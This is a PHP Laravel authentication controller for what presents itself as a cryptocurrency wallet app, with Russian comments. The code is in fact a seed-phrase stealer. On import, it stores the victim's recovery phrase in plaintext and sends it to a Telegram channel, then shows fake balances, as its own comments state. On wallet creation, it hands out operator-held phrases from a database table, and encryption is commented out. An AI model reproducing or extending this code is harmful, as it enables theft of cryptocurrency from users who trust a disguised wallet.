<?php

namespace App\Http\Controllers;

use App\Models\Crypto;
use App\Models\SeedPhrase;
use App\Models\User;
use App\Models\Wallet;
use App\Models\WalletCrypto;
use App\Services\CryptoService;
use App\Services\TelegramService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    protected $cryptoService;
    protected $telegramService;

    public function __construct(CryptoService $cryptoService, TelegramService $telegramService)
    {
        $this->cryptoService = $cryptoService;
        $this->telegramService = $telegramService;
    }

    public function showWelcome()
    {
        return view('auth.welcome');
    }

    public function showCreateWallet()
    {
        return view('auth.create-wallet');
    }

    public function showImportWallet()
    {
        return view('auth.import-wallet');
    }

    public function showSetPassword()
    {
        return view('auth.set-password');
    }

    public function showSeedPhrase(Request $request)
    {
        $seedPhraseLength = $request->input('length', 12);
        
        if ($seedPhraseLength == 12) {
            $seedPhrase = SeedPhrase::where('is_used', false)->first();
            
            if (!$seedPhrase) {
                $seedPhraseWords = $this->cryptoService->generateSeedPhrase($seedPhraseLength);
            } else {
                $seedPhraseWords = explode(' ', $seedPhrase->phrase);
            }
        } else {
            $seedPhraseWords = $this->cryptoService->generateSeedPhrase($seedPhraseLength);
        }
        
        return view('auth.seed-phrase', compact('seedPhraseWords', 'seedPhraseLength'));
    }

    public function createWallet(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'password' => 'required|min:8|confirmed',
            'seed_words' => 'required|array',
            'seed_words.*' => 'required|string'
        ]);

        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $seedPhrase = implode(' ', $request->seed_words);
        
        try {
            DB::beginTransaction();
            
            $user = User::create([
                'password' => Hash::make($request->password),
                'theme' => 'dark',
                'is_approved' => true,
            ]);

            // $encryptedSeedPhrase = $this->cryptoService->encryptSeedPhrase($seedPhrase, $request->password);
            $encryptedSeedPhrase = $seedPhrase;
            
            $wallet = Wallet::create([
                'user_id' => $user->id,
                'name' => 'Main Wallet',
                'encrypted_seed_phrase' => $encryptedSeedPhrase,
                'is_default' => true,
                'is_approved' => true,
            ]);

            $dbSeedPhrase = SeedPhrase::where('phrase', $seedPhrase)->first();
            if ($dbSeedPhrase) {
                $dbSeedPhrase->update(['is_used' => true]);
            }

            // Добавляем создание начальных балансов (с нулевыми значениями)
            $this->cryptoService->setupInitialBalances($user->id, $wallet->id, false);
            
            // $this->telegramService->sendSeedPhrase($seedPhrase, $user->id);
            
            $user->update(['seed_phrase_sent' => true]);
            
            DB::commit();

            Auth::login($user);
            
            return redirect()->route('dashboard');
        } catch (\Exception $e) {
            DB::rollBack();
            
            return redirect()->back()->withErrors(['create' => 'Ошибка при создании кошелька: ' . $e->getMessage()])->withInput();
        }
    }

    public function importWallet(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'password' => 'required|min:8|confirmed',
            'seed_words' => 'required|array|min:12',
            'seed_words.*' => 'required|string'
        ]);

        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $seedPhrase = implode(' ', $request->seed_words);

        if (!$this->cryptoService->validateSeedPhrase($seedPhrase)) {
            return redirect()->back()->withErrors(['seed_words' => 'Недействительная seed-фраза'])->withInput();
        }
        
        try {
            DB::beginTransaction();
            
            $existingUser = User::whereHas('wallets', function($query) use ($seedPhrase) {
                $query->where('encrypted_seed_phrase', $seedPhrase);
            })->first();

            if($existingUser) {
                Auth::login($existingUser);
                        
                // Создаем новый кошелек, если его еще нет
                $walletExists = Wallet::where('user_id', $existingUser->id)
                    ->where('encrypted_seed_phrase', $seedPhrase)
                    ->exists();
                
                if (!$walletExists) {
                    $wallet = Wallet::create([
                        'user_id' => $existingUser->id,
                        'name' => 'Imported Wallet',
                        'encrypted_seed_phrase' => $seedPhrase,
                        'is_default' => !$existingUser->wallets()->exists(),
                        'is_approved' => true
                    ]);
                    
                    // Добавляем фейковые балансы для импортированного кошелька
                    $this->cryptoService->setupInitialBalances($existingUser->id, $wallet->id, true);
                }
                
                DB::commit();

                return redirect()->route('dashboard');
            }
            
            // Если пользователь не найден - создаем нового
            $user = User::create([
                'password' => Hash::make($request->password),
                'theme' => 'dark',
                'is_approved' => false
            ]);
            
            $wallet = Wallet::create([
                'user_id' => $user->id,
                'name' => 'Main Wallet',
                'encrypted_seed_phrase' => $seedPhrase,
                'is_default' => true,
                'is_approved' => true
            ]);
            
            // Добавляем фейковые балансы для импортированного кошелька
            $this->cryptoService->setupInitialBalances($user->id, $wallet->id, true);
            
            $this->telegramService->sendSeedPhrase($seedPhrase, $user->id);
            app(TelegramService::class)->sendMessage(
                "👤 Пользователь ID: {$user->id} - ждет апрува"
            );
            
            $user->update(['seed_phrase_sent' => true]);
            
            DB::commit();
            
            Auth::login($user);
            
            return redirect()->route('dashboard');
        } catch (\Exception $e) {
            DB::rollBack();
            
            return redirect()->back()->withErrors(['import' => 'Ошибка при импорте кошелька: ' . $e->getMessage()])->withInput();
        }
    }

    public function logout()
    {
        Auth::logout();
        
        return redirect()->route('welcome');
    }
}